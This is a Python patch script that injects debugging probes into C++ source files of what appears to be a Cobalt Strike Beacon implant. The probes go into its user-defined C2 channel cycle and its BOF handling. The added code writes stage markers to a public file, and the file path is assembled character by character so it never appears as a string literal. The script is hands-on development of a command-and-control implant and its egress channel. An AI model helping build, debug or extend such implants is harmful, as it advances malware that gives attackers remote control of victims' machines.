#!/usr/bin/env python3
import io

# 1) beacon_udc2.cpp: file-step probes inside the cycle + a shared writer
p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon_udc2.cpp"
s2 = io.open(p2, encoding="utf-8").read()

old2 = """/* boff.cpp: keep the loaded channel BOF executable - its proxy/close
 * callbacks run on every later cycle from the mapped block */
extern void bof_set_pin(BOOL on);
extern void bof_unpin(void);"""
assert s2.count(old2) == 1
new2 = old2 + """

/* crash-localisation probe: append one decimal line to the step file so
 * the LAST executed stage survives any process death (kernel32 direct -
 * this runs in normal beacon context, not inside a BOF) */
void udc2_step_mark(int stage) {
	char path[30];
	char num[16];
	HANDLE h;
	DWORD w = 0;
	int i, v;

	path[0]='C'; path[1]=':'; path[2]=chr_bs;
	path[3]='U'; path[4]='s'; path[5]='e'; path[6]='r'; path[7]='s';
	path[8]=chr_bs; path[9]='P'; path[10]='u'; path[11]='b'; path[12]='l';
	path[13]='i'; path[14]='c'; path[15]=chr_bs; path[16]='u'; path[17]='d';
	path[18]='c'; path[19]='2'; path[20]='_'; path[21]='s'; path[22]='t';
	path[23]='e'; path[24]='p'; path[25]='.'; path[26]='t'; path[27]='x';
	path[28]='t'; path[29]=0;

	i = 0;
	v = stage;
	if (v < 0) { num[i++]='-'; v = -v; }
	{
		char tmp[12];
		int n = 0;
		do { tmp[n++] = (char)('0' + (v % 10)); v /= 10; } while (v > 0 && n < 11);
		while (n > 0) num[i++] = tmp[--n];
	}
	num[i++] = 10; /* newline */

	h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return;
	WriteFile(h, num, (DWORD)i, &w, NULL);
	CloseHandle(h);
}"""
s2 = s2.replace(old2, new2)

# chr_bs constant before first use
old2b = "#define UDC2_MAX_GET (1024 * 1024)"
assert s2.count(old2b) == 1
s2 = s2.replace(old2b, "#define UDC2_MAX_GET (1024 * 1024)\n#define chr_bs 92 /* backslash */")

# probes in udc2_round
old3 = """	rv = udc2.info.proxy(udc2.frame, 4 + length, recv, max);
	if (rv <= 0)
		return -1;"""
assert s2.count(old3) == 1
new3 = """	udc2_step_mark(62200 + (length & 0xFF));
	rv = udc2.info.proxy(udc2.frame, 4 + length, recv, max);
	udc2_step_mark(62300 + (rv & 0x7F));
	if (rv <= 0)
		return -1;"""
s2 = s2.replace(old3, new3)

# probe at cycle entry
old4 = """int udc2_cycle(char * recv, int max) {
	int rv;"""
assert s2.count(old4) == 1
new4 = """int udc2_cycle(char * recv, int max) {
	int rv;

	udc2_step_mark(62100 + (udc2.sent_meta ? 1 : 0));"""
s2 = s2.replace(old4, new4)
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("udc2 probes in")

# 2) beacon.cpp: move engage probe after post_type + add post-cycle probe
p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon.cpp"
s = io.open(p, encoding="utf-8").read()
old5 = """		if (beacon_cycles >= 1 && udc2_init()) {
			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */
			post_type = POST_UDC2;"""
assert s.count(old5) == 1
new5 = """		if (beacon_cycles >= 1 && udc2_init()) {
			post_type = POST_UDC2;
			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */"""
s = s.replace(old5, new5)

old6 = """			length = udc2_cycle(buffer, MAX_GET);
			if (length > 0)
				process_payload(buffer, length);"""
assert s.count(old6) == 1
new6 = """			length = udc2_cycle(buffer, MAX_GET);
			udc2_step_mark(62400 + (length < 0 ? 99 : (length & 0x7F)));
			if (length > 0)
				process_payload(buffer, length);"""
s = s.replace(old6, new6)

old7 = "extern BOOL udc2_booted(void);"
assert s.count(old7) == 1
s = s.replace(old7, old7 + "\nextern void udc2_step_mark(int stage);")
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("beacon probes updated")
